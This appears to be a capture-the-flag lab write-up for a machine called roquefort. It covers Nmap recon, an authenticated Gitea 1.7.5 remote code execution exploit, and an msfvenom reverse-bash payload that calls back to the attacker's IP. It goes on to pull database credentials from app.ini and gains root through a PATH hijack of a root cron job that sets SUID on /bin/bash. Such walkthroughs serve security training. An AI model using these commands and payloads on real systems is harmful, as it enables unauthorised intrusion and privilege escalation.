Writeup by wook413

[TOC]

# Recon

## Nmap

I began the machine with a standard three-stage Nmap recon: a full TCP scan against all 65,535 ports, followed by a targeted service scan of the discovered ports, and a UDP scan of the top 10 ports.

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap $IP -Pn -n --open --min-rate 3000 -p-
Starting Nmap 7.95 ( <https://nmap.org> ) at 2026-02-10 02:05 UTC
Nmap scan report for 192.168.188.67
Host is up (0.048s latency).
Not shown: 65530 filtered tcp ports (no-response), 1 closed tcp port (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
2222/tcp open  EtherNetIP-1
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 43.91 seconds
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap $IP -sC -sV -p 21,22,2222,3000       
Starting Nmap 7.95 ( <https://nmap.org> ) at 2026-02-10 02:09 UTC
Nmap scan report for 192.168.188.67
Host is up (0.050s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     ProFTPD 1.3.5b
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:77:6f:b1:ed:65:b5:ad:14:64:40:d2:24:d3:9c:0d (RSA)
|   256 a9:b4:4f:61:2e:2d:9d:4c:48:15:fe:70:8e:fa:af:b3 (ECDSA)
|_  256 92:56:eb:af:c9:34:af:ea:a1:cf:9f:e1:90:dd:2f:61 (ED25519)
2222/tcp open  ssh     Dropbear sshd 2016.74 (protocol 2.0)
3000/tcp open  http    Golang net/http server
|_http-title: Gitea: Git with a cup of tea
| fingerprint-strings: 
|   GenericLines, Help: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=3feb843f1e1bc6e7; Path=/; HttpOnly
|     Set-Cookie: _csrf=EzPZXo_8SkMyHBitpDcgpBsnoUs6MTc3MDY4OTM0ODc2MjY5MTk2OA%3D%3D; Path=/; Expires=Wed, 11 Feb 2026 02:09:08 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Tue, 10 Feb 2026 02:09:08 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <script>
|     ('serviceWorker' in navigator) {
|     window.addEventListener('load', function() {
|     navigator.serviceWorker.register('/serviceworker.js').then(function(registration) {
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=9c507d35c297f714; Path=/; HttpOnly
|     Set-Cookie: _csrf=_rLUB7EDvGqNu7hd2D3IIBp5uas6MTc3MDY4OTM0OTA3MDM5MTk2MA%3D%3D; Path=/; Expires=Wed, 11 Feb 2026 02:09:09 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Tue, 10 Feb 2026 02:09:09 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Page Not Found - Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <script>
|     ('serviceWorker' in navigator) {
|     window.addEventListener('load', function() {
|_    navigator.serviceWorker.register('/serviceworker.js').then(function(registration
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <https://nmap.org/cgi-bin/submit.cgi?new-service> :
SF-Port3000-TCP:V=7.95%I=7%D=2/10%Time=698A9343%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20t
SF:ext/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x
SF:20Request")%r(GetRequest,1000,"HTTP/1\\.0\\x20200\\x20OK\\r\\nContent-Type:\\
SF:x20text/html;\\x20charset=UTF-8\\r\\nSet-Cookie:\\x20lang=en-US;\\x20Path=/;
SF:\\x20Max-Age=2147483647\\r\\nSet-Cookie:\\x20i_like_gitea=3feb843f1e1bc6e7;
SF:\\x20Path=/;\\x20HttpOnly\\r\\nSet-Cookie:\\x20_csrf=EzPZXo_8SkMyHBitpDcgpBs
SF:noUs6MTc3MDY4OTM0ODc2MjY5MTk2OA%3D%3D;\\x20Path=/;\\x20Expires=Wed,\\x2011
SF:\\x20Feb\\x202026\\x2002:09:08\\x20GMT;\\x20HttpOnly\\r\\nX-Frame-Options:\\x20
SF:SAMEORIGIN\\r\\nDate:\\x20Tue,\\x2010\\x20Feb\\x202026\\x2002:09:08\\x20GMT\\r\\n
SF:\\r\\n<!DOCTYPE\\x20html>\\n<html>\\n<head\\x20data-suburl=\\"\\">\\n\\t<meta\\x20
SF:charset=\\"utf-8\\">\\n\\t<meta\\x20name=\\"viewport\\"\\x20content=\\"width=dev
SF:ice-width,\\x20initial-scale=1\\">\\n\\t<meta\\x20http-equiv=\\"x-ua-compatib
SF:le\\"\\x20content=\\"ie=edge\\">\\n\\t<title>Gitea:\\x20Git\\x20with\\x20a\\x20cu
SF:p\\x20of\\x20tea</title>\\n\\t<link\\x20rel=\\"manifest\\"\\x20href=\\"/manifest
SF:\\.json\\"\\x20crossorigin=\\"use-credentials\\">\\n\\t\\n\\t<script>\\n\\t\\tif\\x2
SF:0\\('serviceWorker'\\x20in\\x20navigator\\)\\x20{\\n\\x20\\x20\\t\\t\\twindow\\.add
SF:EventListener\\('load',\\x20function\\(\\)\\x20{\\n\\x20\\x20\\x20\\x20\\t\\t\\tnavi
SF:gator\\.serviceWorker\\.register\\('/serviceworker\\.js'\\)\\.then\\(function\\
SF:(registration\\)\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20\\t\\t\\t\\t\\n\\x20\\x20\\x20\\x2
SF:0\\x20\\x20\\t\\t\\t")%r(Help,67,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nCont
SF:ent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r
SF:\\n400\\x20Bad\\x20Request")%r(HTTPOptions,1FE2,"HTTP/1\\.0\\x20404\\x20Not\\x
SF:20Found\\r\\nContent-Type:\\x20text/html;\\x20charset=UTF-8\\r\\nSet-Cookie:\\
SF:x20lang=en-US;\\x20Path=/;\\x20Max-Age=2147483647\\r\\nSet-Cookie:\\x20i_lik
SF:e_gitea=9c507d35c297f714;\\x20Path=/;\\x20HttpOnly\\r\\nSet-Cookie:\\x20_csr
SF:f=_rLUB7EDvGqNu7hd2D3IIBp5uas6MTc3MDY4OTM0OTA3MDM5MTk2MA%3D%3D;\\x20Path
SF:=/;\\x20Expires=Wed,\\x2011\\x20Feb\\x202026\\x2002:09:09\\x20GMT;\\x20HttpOnl
SF:y\\r\\nX-Frame-Options:\\x20SAMEORIGIN\\r\\nDate:\\x20Tue,\\x2010\\x20Feb\\x2020
SF:26\\x2002:09:09\\x20GMT\\r\\n\\r\\n<!DOCTYPE\\x20html>\\n<html>\\n<head\\x20data-
SF:suburl=\\"\\">\\n\\t<meta\\x20charset=\\"utf-8\\">\\n\\t<meta\\x20name=\\"viewport
SF:\\"\\x20content=\\"width=device-width,\\x20initial-scale=1\\">\\n\\t<meta\\x20h
SF:ttp-equiv=\\"x-ua-compatible\\"\\x20content=\\"ie=edge\\">\\n\\t<title>Page\\x2
SF:0Not\\x20Found\\x20-\\x20Gitea:\\x20Git\\x20with\\x20a\\x20cup\\x20of\\x20tea</t
SF:itle>\\n\\t<link\\x20rel=\\"manifest\\"\\x20href=\\"/manifest\\.json\\"\\x20cross
SF:origin=\\"use-credentials\\">\\n\\t\\n\\t<script>\\n\\t\\tif\\x20\\('serviceWorker
SF:'\\x20in\\x20navigator\\)\\x20{\\n\\x20\\x20\\t\\t\\twindow\\.addEventListener\\('l
SF:oad',\\x20function\\(\\)\\x20{\\n\\x20\\x20\\x20\\x20\\t\\t\\tnavigator\\.serviceWor
SF:ker\\.register\\('/serviceworker\\.js'\\)\\.then\\(function\\(registration");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 119.96 seconds
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap $IP -sU --top-ports 10        
Starting Nmap 7.95 ( <https://nmap.org> ) at 2026-02-10 02:11 UTC
Nmap scan report for 192.168.188.67
Host is up (0.050s latency).

PORT     STATE         SERVICE
53/udp   open|filtered domain
67/udp   open|filtered dhcps
123/udp  open|filtered ntp
135/udp  open|filtered msrpc
137/udp  open|filtered netbios-ns
138/udp  open|filtered netbios-dgm
161/udp  open|filtered snmp
445/udp  open|filtered microsoft-ds
631/udp  open|filtered ipp
1434/udp open|filtered ms-sql-m

Nmap done: 1 IP address (1 host up) scanned in 1.84 seconds
```

# Initial Access

## FTP 21

Initial checks on the FTP service confirmed that `anonymous login` was disabled.

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ ftp $IP
Connected to 192.168.188.67.
220 ProFTPD 1.3.5b Server (Debian) [::ffff:192.168.188.67]
Name (192.168.188.67:kali): anonymous
331 Password required for anonymous
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 
```

## HTTP 3000

Shifting focus to HTTP service on port 3000, I ran the `http-enum` script, which identified `/healthcheck`, `/manifest.json`, and `/debug` . Given their naming conventions, they didn’t appear to house sensitive information at first glance.

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap $IP -sV --script=http-enum -p 3000
Starting Nmap 7.95 ( <https://nmap.org> ) at 2026-02-10 02:14 UTC
Nmap scan report for 192.168.188.67
Host is up (0.047s latency).

PORT     STATE SERVICE VERSION
3000/tcp open  http    Golang net/http server
| fingerprint-strings: 
|   GenericLines, Help: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=55703924a58d90c0; Path=/; HttpOnly
|     Set-Cookie: _csrf=81KkCA9Pt4s22uy0I-M7tItqkqM6MTc3MDY4OTY2ODg3OTYyNDcyMw%3D%3D; Path=/; Expires=Wed, 11 Feb 2026 02:14:28 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Tue, 10 Feb 2026 02:14:28 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <script>
|     ('serviceWorker' in navigator) {
|     window.addEventListener('load', function() {
|     navigator.serviceWorker.register('/serviceworker.js').then(function(registration) {
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=ace3bce5e51a1270; Path=/; HttpOnly
|     Set-Cookie: _csrf=HK4eKpq0_mC4TQEDsoDrObH9q9A6MTc3MDY4OTY2OTE0Mzc5NjYwMg%3D%3D; Path=/; Expires=Wed, 11 Feb 2026 02:14:29 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Tue, 10 Feb 2026 02:14:29 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Page Not Found - Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <script>
|     ('serviceWorker' in navigator) {
|     window.addEventListener('load', function() {
|_    navigator.serviceWorker.register('/serviceworker.js').then(function(registration
| http-enum: 
|   /healthcheck/: Spring Boot Actuator endpoint
|   /manifest.json: Manifest JSON File
|_  /debug/: Potentially interesting folder
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <https://nmap.org/cgi-bin/submit.cgi?new-service> :
SF-Port3000-TCP:V=7.95%I=7%D=2/10%Time=698A9483%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20t
SF:ext/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x
SF:20Request")%r(GetRequest,25B0,"HTTP/1\\.0\\x20200\\x20OK\\r\\nContent-Type:\\
SF:x20text/html;\\x20charset=UTF-8\\r\\nSet-Cookie:\\x20lang=en-US;\\x20Path=/;
SF:\\x20Max-Age=2147483647\\r\\nSet-Cookie:\\x20i_like_gitea=55703924a58d90c0;
SF:\\x20Path=/;\\x20HttpOnly\\r\\nSet-Cookie:\\x20_csrf=81KkCA9Pt4s22uy0I-M7tIt
SF:qkqM6MTc3MDY4OTY2ODg3OTYyNDcyMw%3D%3D;\\x20Path=/;\\x20Expires=Wed,\\x2011
SF:\\x20Feb\\x202026\\x2002:14:28\\x20GMT;\\x20HttpOnly\\r\\nX-Frame-Options:\\x20
SF:SAMEORIGIN\\r\\nDate:\\x20Tue,\\x2010\\x20Feb\\x202026\\x2002:14:28\\x20GMT\\r\\n
SF:\\r\\n<!DOCTYPE\\x20html>\\n<html>\\n<head\\x20data-suburl=\\"\\">\\n\\t<meta\\x20
SF:charset=\\"utf-8\\">\\n\\t<meta\\x20name=\\"viewport\\"\\x20content=\\"width=dev
SF:ice-width,\\x20initial-scale=1\\">\\n\\t<meta\\x20http-equiv=\\"x-ua-compatib
SF:le\\"\\x20content=\\"ie=edge\\">\\n\\t<title>Gitea:\\x20Git\\x20with\\x20a\\x20cu
SF:p\\x20of\\x20tea</title>\\n\\t<link\\x20rel=\\"manifest\\"\\x20href=\\"/manifest
SF:\\.json\\"\\x20crossorigin=\\"use-credentials\\">\\n\\t\\n\\t<script>\\n\\t\\tif\\x2
SF:0\\('serviceWorker'\\x20in\\x20navigator\\)\\x20{\\n\\x20\\x20\\t\\t\\twindow\\.add
SF:EventListener\\('load',\\x20function\\(\\)\\x20{\\n\\x20\\x20\\x20\\x20\\t\\t\\tnavi
SF:gator\\.serviceWorker\\.register\\('/serviceworker\\.js'\\)\\.then\\(function\\
SF:(registration\\)\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20\\t\\t\\t\\t\\n\\x20\\x20\\x20\\x2
SF:0\\x20\\x20\\t\\t\\t")%r(Help,67,"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nCont
SF:ent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r
SF:\\n400\\x20Bad\\x20Request")%r(HTTPOptions,1FE2,"HTTP/1\\.0\\x20404\\x20Not\\x
SF:20Found\\r\\nContent-Type:\\x20text/html;\\x20charset=UTF-8\\r\\nSet-Cookie:\\
SF:x20lang=en-US;\\x20Path=/;\\x20Max-Age=2147483647\\r\\nSet-Cookie:\\x20i_lik
SF:e_gitea=ace3bce5e51a1270;\\x20Path=/;\\x20HttpOnly\\r\\nSet-Cookie:\\x20_csr
SF:f=HK4eKpq0_mC4TQEDsoDrObH9q9A6MTc3MDY4OTY2OTE0Mzc5NjYwMg%3D%3D;\\x20Path
SF:=/;\\x20Expires=Wed,\\x2011\\x20Feb\\x202026\\x2002:14:29\\x20GMT;\\x20HttpOnl
SF:y\\r\\nX-Frame-Options:\\x20SAMEORIGIN\\r\\nDate:\\x20Tue,\\x2010\\x20Feb\\x2020
SF:26\\x2002:14:29\\x20GMT\\r\\n\\r\\n<!DOCTYPE\\x20html>\\n<html>\\n<head\\x20data-
SF:suburl=\\"\\">\\n\\t<meta\\x20charset=\\"utf-8\\">\\n\\t<meta\\x20name=\\"viewport
SF:\\"\\x20content=\\"width=device-width,\\x20initial-scale=1\\">\\n\\t<meta\\x20h
SF:ttp-equiv=\\"x-ua-compatible\\"\\x20content=\\"ie=edge\\">\\n\\t<title>Page\\x2
SF:0Not\\x20Found\\x20-\\x20Gitea:\\x20Git\\x20with\\x20a\\x20cup\\x20of\\x20tea</t
SF:itle>\\n\\t<link\\x20rel=\\"manifest\\"\\x20href=\\"/manifest\\.json\\"\\x20cross
SF:origin=\\"use-credentials\\">\\n\\t\\n\\t<script>\\n\\t\\tif\\x20\\('serviceWorker
SF:'\\x20in\\x20navigator\\)\\x20{\\n\\x20\\x20\\t\\t\\twindow\\.addEventListener\\('l
SF:oad',\\x20function\\(\\)\\x20{\\n\\x20\\x20\\x20\\x20\\t\\t\\tnavigator\\.serviceWor
SF:ker\\.register\\('/serviceworker\\.js'\\)\\.then\\(function\\(registration");

Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 143.72 seconds
```

Further inspection revealed that the service on port 3000 was `Gitea v1.7.5` .

<img src="./roquefort.assets/image-20260214133902764.png" alt="image-20260214133902764" style="zoom:67%;" />

A `searchsploit` query for this version yielded a matching exploit.

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ searchsploit gitea 1.7.5          
-------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                          |  Path
-------------------------------------------------------------------------------------------------------- ---------------------------------
Gitea 1.7.5 - Remote Code Execution                                                                     | multiple/webapps/49383.py
-------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Since the exploit required valid credentials, I manually registered a new account on the page.

<img src="./roquefort.assets/image-20260214133909195.png" alt="image-20260214133909195" style="zoom: 67%;" />

I updated the exploit script with the target’s details and my Kali Linux IP/port to point to my HTTP server.

<img src="./roquefort.assets/image-20260214133913521.png" alt="image-20260214133913521" style="zoom:67%;" />

Using `msfvenom`, I generated a payload named `shell.sh` . The exploit was configured to fetch this via port 2222, which, upon execution, would trigger a reverse shell back to my listener on port 21.

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ msfvenom -p cmd/unix/reverse_bash LHOST=192.168.45.229 LPORT=21 -f raw > shell.sh
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 71 bytes
```

Upon running the exploit, the payload was successfully triggered.

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ python3 49383.py   
Logging in
Logged in successfully
Retrieving user ID
Retrieved user ID: 1
hint: Using 'master' as the name for the initial branch. This default branch name
hint: is subject to change. To configure the initial branch name to use in all
hint: of your new repositories, which will suppress this warning, call:
hint:
hint:   git config --global init.defaultBranch <name>
hint:
hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
hint: 'development'. The just-created branch can be renamed via this command:
hint:
hint:   git branch -m <name>
Initialized empty Git repository in /tmp/tmph_ctoq7j/.git/
[master (root-commit) 3898444] x
 1 file changed, 0 insertions(+), 0 deletions(-)
 create mode 100644 x
Cloning into bare repository '/tmp/tmph_ctoq7j.git'...
done.
Created temporary git server to host /tmp/tmph_ctoq7j.git
Creating repository
192.168.188.67 - - [10/Feb/2026 02:36:53] "GET /tmph_ctoq7j.git/info/refs?service=git-upload-pack HTTP/1.1" 200 -
192.168.188.67 - - [10/Feb/2026 02:36:53] "GET /tmph_ctoq7j.git/HEAD HTTP/1.1" 200 -
192.168.188.67 - - [10/Feb/2026 02:36:53] "GET /tmph_ctoq7j.git/objects/38/98444a7e807229a1d3f0233b82dbb5443b09d3 HTTP/1.1" 200 -
192.168.188.67 - - [10/Feb/2026 02:36:53] "GET /tmph_ctoq7j.git/objects/58/05b676e247eb9a8046ad0c4d249cd2fb2513df HTTP/1.1" 200 -
192.168.188.67 - - [10/Feb/2026 02:36:53] "GET /tmph_ctoq7j.git/objects/e6/9de29bb2d1d6434b8b29ae775ad8c2e48c5391 HTTP/1.1" 200 -
192.168.188.67 - - [10/Feb/2026 02:36:53] code 404, message File not found
192.168.188.67 - - [10/Feb/2026 02:36:53] "GET /tmph_ctoq7j.wiki.git/info/refs?service=git-upload-pack HTTP/1.1" 404 -
192.168.188.67 - - [10/Feb/2026 02:36:53] code 404, message File not found
192.168.188.67 - - [10/Feb/2026 02:36:53] "GET /tmph_ctoq7j.git/wiki/info/refs?service=git-upload-pack HTTP/1.1" 404 -
Repo "izffjehp" created
Injecting command into repo
Command injected
Triggering command
Command triggered
```

# Shell as `chloe`

I successfully established a shell session as the user `chloe`.

<img src="./roquefort.assets/image-20260214133920537.png" alt="image-20260214133920537" style="zoom:67%;" />

Found `local.txt`

```bash
chloe@roquefort:~$ ls -la
total 36
drwxr-xr-x 4 chloe chloe 4096 Feb  9 21:30 .
drwxr-xr-x 3 root  root  4096 Apr 22  2020 ..
-rw-r--r-- 1 chloe chloe  220 Apr 22  2020 .bash_logout
-rw-r--r-- 1 chloe chloe 3526 Apr 22  2020 .bashrc
-rw-r--r-- 1 chloe chloe   73 Oct 22 23:26 .gitconfig
drwxr-xr-x 3 chloe chloe 4096 Feb  9 21:30 gitea-repositories
-rw-r--r-- 1 chloe chloe   33 Feb  9 21:05 local.txt
-rw-r--r-- 1 chloe chloe  675 Apr 22  2020 .profile
drwx------ 2 chloe chloe 4096 May  8  2020 .ssh
chloe@roquefort:~$ cat local.txt
870...
```

# Privilege Escalation

I began manual enumeration for privilege escalation vectors and deployed `pspy` to monitor background processes, though no immediate leads were found.

```bash
chloe@roquefort:/tmp$ wget <http://192.168.45.229:2222/pspy64> pspy64
--2026-02-09 21:43:31--  <http://192.168.45.229:2222/pspy64>
Connecting to 192.168.45.229:2222... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                             100%[==============================================================>]   2.96M  3.53MB/s    in 0.8s    

2026-02-09 21:43:32 (3.53 MB/s) - ‘pspy64’ saved [3104768/3104768]

--2026-02-09 21:43:32--  <http://pspy64/>
Resolving pspy64 (pspy64)... failed: Name or service not known.
wget: unable to resolve host address ‘pspy64’
FINISHED --2026-02-09 21:43:32--
Total wall clock time: 0.9s
Downloaded: 1 files, 3.0M in 0.8s (3.53 MB/s)
```

<img src="./roquefort.assets/image-20260214133945703.png" alt="image-20260214133945703" style="zoom:67%;" />

I eventually discovered `giteadb` credentials within the `app.ini` configuration file located at `/etc/gitea`.

```bash
chloe@roquefort:/etc/gitea$ cat app.ini                                                                                                   
APP_NAME = Gitea: Git with a cup of tea                                                                                                   
RUN_USER = chloe                                                                                                                          
RUN_MODE = prod                                                                                                                           
                                                                                                                                          
[security]                                                                                                                                
INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE1ODcwMjE0OTN9.MJ7tNyllwrVX-1KrwFs2n33sVklzKF044wPsPld_TV8                
INSTALL_LOCK   = true                                                                                                                     
SECRET_KEY     = 6jWzFW4a2otfWHLtnHRE69zuCL2ffh4ZeMF29CBAQfH7xMZPPBXR1XuuZXZ6s8m4                                                         
                                                                                                                                          
[database]                                                                                                                                
DB_TYPE  = mysql                                                                                                                          
HOST     = 127.0.0.1:3306                                                                                                                 
NAME     = giteadb                                                                                                                        
USER     = gitea                                                                                                                          
PASSWD   = 7d98afcbd8a6c5b8c2dfb07bcbe29d34                                                                                               
SSL_MODE = disable                                                                                                                        
PATH     = data/gitea.db                                                                                                                  
                                                                                                                                          
[repository]                                                                                                                              
ROOT = /home/chloe/gitea-repositories                                                                                                     
                                                                                                                                          
[server]                                                                                                                                  
SSH_DOMAIN       = localhost                                                                                                              
DOMAIN           = localhost
HTTP_PORT        = 3000
ROOT_URL         = <http://localhost:3000/>
DISABLE_SSH      = false
SSH_PORT         = 22
LFS_START_SERVER = true
LFS_CONTENT_PATH = /var/lib/gitea/data/lfs
LFS_JWT_SECRET   = y3E8LFr-gJTlVmu9JZbDArkyfDW3ca4x7X85yY-w_P8
OFFLINE_MODE     = true

<SNIP>
```

I successfully logged in to the `MariaDB` instance using these credentials, but the database did not yield any further paths for escalation.

```bash
chloe@roquefort:/etc/gitea$ mysql -h 127.0.0.1 -u gitea -p'7d98afcbd8a6c5b8c2dfb07bcbe29d34'
Welcome to the MariaDB monitor.  Commands end with ; or \\g.
Your MariaDB connection id is 14
Server version: 10.1.44-MariaDB-0+deb9u1 Debian 9.11

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.

MariaDB [(none)]> 
MariaDB [(none)]> show databases;
+--------------------+     
| Database           |     
+--------------------+            
| giteadb            | 
| information_schema | 
+--------------------+            
2 rows in set (0.00 sec)
MariaDB [giteadb]> show tables;        
+---------------------+                
| Tables_in_giteadb   |                
+---------------------+                     
| access              |                     
| access_token        |                     
| action              |                     
| attachment          |                                       
| collaboration       |                                       
| comment             |                                       
| commit_status       |                                       
| deleted_branch      |                                       
| deploy_key          |                                       
| email_address       |                                       
| external_login_user |                                       
| follow              |                                       
| gpg_key             |                                       
| hook_task           |                                       
| issue               |                                       
| issue_assignees     |                                       
| issue_dependency    |                                       
| issue_label         |                                       
| issue_user          |                                       
| issue_watch         |                                       
| label               |                                       
| lfs_lock            |                                       
| lfs_meta_object     |                                       
| login_source        |                                       
| milestone           |                                       
| mirror              |                                       
| notice              |                                       
| notification        |                                       
| oauth2_session      |                                       
| org_user            |                                       
| protected_branch    |                                       
| public_key          |                                       
| pull_request        |                                       
| reaction            |                                       
| release             |                                       
| repo_indexer_status |                                       
| repo_redirect       |                                       
| repo_topic          |                                       
| repo_unit           |                                       
| repository          |                                       
| review              |                                       
| star                |                                       
| stopwatch           |                                       
| team                |                                       
| team_repo           |                                       
| team_unit           |                                       
| team_user           |                                       
| topic               |                                       
| tracked_time        |                                       
| two_factor          |                                       
| u2f_registration    |                                       
| upload              |                                       
| user                |                                       
| user_open_id        |                                       
| version             |                                       
| watch               |                                       
| webhook             |                                       
+---------------------+                                       
57 rows in set (0.01 sec)
```

With manual leads exhausted, I transferred and executed `linpeas.sh`

```bash
chloe@roquefort:/tmp$ wget <http://192.168.45.229:2222/linpeas.sh> linpeas.sh
--2026-02-09 21:55:44--  <http://192.168.45.229:2222/linpeas.sh>
Connecting to 192.168.45.229:2222... connected.
HTTP request sent, awaiting response... 200 OK
Length: 956174 (934K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                         100%[==============================================================>] 933.76K  2.85MB/s    in 0.3s    

2026-02-09 21:55:44 (2.85 MB/s) - ‘linpeas.sh’ saved [956174/956174]
```

linpeas immediately flagged a potential vulnrability in the `PATH` environment variable.

<img src="./roquefort.assets/image-20260214134001173.png" alt="image-20260214134001173" style="zoom:67%;" />

I confirmed that I had write permissions for the `/usr/local/bin` directory.

```bash
chloe@roquefort:/tmp$ ls -ld /usr/local/bin
drwxrwsrwx 2 root staff 4096 Apr 24  2020 /usr/local/bin
```

Inspecting `/etc/crontab` , I noticed the `run-parts` binary was being called without its absolute path. Since `/usr/local/bin` comes before `/usr/bin` and `/bin` in the system’s `PATH`, I identified a clear opportunity for a **PATH injection attack**.

```bash
chloe@roquefort:/tmp$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/5 *   * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

I placed a malicious script named `run-parts` .

```bash
chloe@roquefort:/usr/local/bin$ echo -e '#!/bin/bash\\nchmod u+s /bin/bash' > run-parts
chloe@roquefort:/usr/local/bin$ chmod +x run-parts 
chloe@roquefort:/usr/local/bin$ ls -la
total 63784
drwxrwsrwx  2 root  staff     4096 Feb  9 22:28 .
drwxrwsr-x 10 root  staff     4096 Apr 21  2020 ..
-rwxr-xr-x  1 root  staff 65299840 Mar  6  2020 gitea
-rwxr-xr-x  1 chloe staff       32 Feb  9 22:28 run-parts
```

Shortly after, I observed that the **SUID** bit had been successfully applied to `/bin/bash`.

```bash
chloe@roquefort:/usr/local/bin$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1099016 May 15  2017 /bin/bash
```

# Shell as `root`

I obtained a root shell by executing `/bin/bash -p`.

```bash
chloe@roquefort:/usr/local/bin$ /bin/bash -p
bash-4.4# whoami; id
root
uid=1000(chloe) gid=1000(chloe) euid=0(root) groups=1000(chloe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

Found `proof.txt`

```bash
bash-4.4# cd /root
bash-4.4# ls -la
total 28
